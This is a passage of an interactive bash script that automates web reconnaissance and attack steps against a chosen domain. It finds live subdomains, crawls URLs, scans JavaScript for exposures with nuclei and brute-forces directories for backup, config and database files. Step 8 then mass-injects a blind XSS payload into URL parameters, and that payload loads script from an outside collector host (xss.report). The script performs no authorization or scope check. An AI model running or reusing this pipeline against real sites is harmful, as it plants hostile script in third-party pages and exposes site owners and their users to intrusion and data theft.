...
step_alive_subdomains() {
    ...
    echo -e "${YELLOW}[*] Running: cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt${RESET}"
    
    if $VERBOSE; then
        cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 | tee subdomains_alive.txt
    else
...
step_url_crawling() {
    ...
    echo -e "${YELLOW}[*] Running: katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt${RESET}"
    
    if $VERBOSE; then
        katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | tee allurls.txt
    else
...
step_extract_js_files() {
    ...
    echo -e "${YELLOW}[*] Running: cat allurls.txt | grep -E \".js$\" > js_files.txt${RESET}"
    ...
    if $VERBOSE && [[ $count -gt 0 ]]; then
        echo -e "${YELLOW}[*] JavaScript files found:${RESET}"
        cat js_files.txt | head -10
        if [[ $count -gt 10 ]]; then
            echo -e "${YELLOW}[*] And ${WHITE}$((count-10))${YELLOW} more...${RESET}"
        fi
    fi
    
    # Ask user what to do next
    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
    echo -e "   ${WHITE}1)${RESET} Proceed to Step 6 (Scan for JavaScript Exposures)"
    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
    read -p "Enter your choice [1-3]: " choice
...
# Step 6: Scan for JavaScript Exposures
step_scan_js_exposures() {
    CURRENT_STEP=6
    display_progress
    
    echo -e "${BLUE}[*] Step 6: Scan for JavaScript Exposures${RESET}"
    echo -e "${YELLOW}[*] Running: cat js_files.txt | nuclei -t ~/nuclei-templates/http/exposures/ -o js_exposures.txt${RESET}"
    
    if $VERBOSE; then
        cat js_files.txt | nuclei -t ~/nuclei-templates/http/exposures/ | tee js_exposures.txt
    else
        cat js_files.txt | nuclei -t ~/nuclei-templates/http/exposures/ -o js_exposures.txt
    fi
    
    # Check if the file exists and has content
    if [[ -f "js_exposures.txt" && -s "js_exposures.txt" ]]; then
        local count=$(wc -l < js_exposures.txt)
        echo -e "${GREEN}[+] Found ${WHITE}${count}${GREEN} potential JavaScript exposures.${RESET}"
        
        if $VERBOSE; then
            echo -e "${YELLOW}[*] JavaScript exposures found:${RESET}"
            cat js_exposures.txt
        fi
    else
        echo -e "${GREEN}[+] No JavaScript exposures found.${RESET}"
        echo "" > js_exposures.txt
    fi
    
    # Ask user what to do next
    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
    echo -e "   ${WHITE}1)${RESET} Proceed to Step 7 (Directory Brute Force)"
    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
    read -p "Enter your choice [1-3]: " choice
...
step_directory_bruteforce() {
    ...
    echo -e "${BLUE}[*] Step 7: Directory Brute Force${RESET}"
    echo -e "${YELLOW}[*] Running: dirsearch -u https://$DOMAIN/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json/ -o directory_bruteforce.txt${RESET}"
    
    if $VERBOSE; then
        dirsearch -u "https://$DOMAIN/" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json/ | tee directory_bruteforce.txt
    else
        dirsearch -u "https://$DOMAIN/" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json/ -o directory_bruteforce.txt
    fi
    
    # Check if the file exists
    if [[ -f "directory_bruteforce.txt" ]]; then
        echo -e "${GREEN}[+] Directory brute force completed. Results saved to directory_bruteforce.txt${RESET}"
    else
        echo -e "${RED}[!] Directory brute force failed or no results found.${RESET}"
        echo "No results found" > directory_bruteforce.txt
    fi
    
    # Ask user what to do next
    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
    echo -e "   ${WHITE}1)${RESET} Proceed to Step 8 (XSS Vulnerability Testing)"
    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
    read -p "Enter your choice [1-3]: " choice
...
# Step 8: XSS Vulnerability Testing
step_xss_testing() {
    CURRENT_STEP=8
    display_progress
    
    echo -e "${BLUE}[*] Step 8: XSS Vulnerability Testing${RESET}"
    echo -e "${YELLOW}[*] Running: subfinder -d $DOMAIN | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters > xss_results.txt${RESET}"
    
    if $VERBOSE; then
        subfinder -d "$DOMAIN" | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters | tee xss_results.txt
    else
        subfinder -d "$DOMAIN" | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters > xss_results.txt
    fi
    
    # Check if the file exists and has content
    if [[ -f "xss_results.txt" && -s "xss_results.txt" ]]; then
        echo -e "${GREEN}[+] XSS testing completed. Results saved to xss_results.txt${RESET}"
        
        if $VERBOSE; then
            echo -e "${YELLOW}[*] XSS vulnerabilities found:${RESET}"
            cat xss_results.txt
        fi
    else
        echo -e "${GREEN}[+] No XSS vulnerabilities found.${RESET}"
        echo "No XSS vulnerabilities found" > xss_results.txt
    fi
    
    # Ask user what to do next
    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
    echo -e "   ${WHITE}1)${RESET} Proceed to Step 9 (Subdomain Takeover Check)"
    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
    read -p "Enter your choice [1-3]: " choice
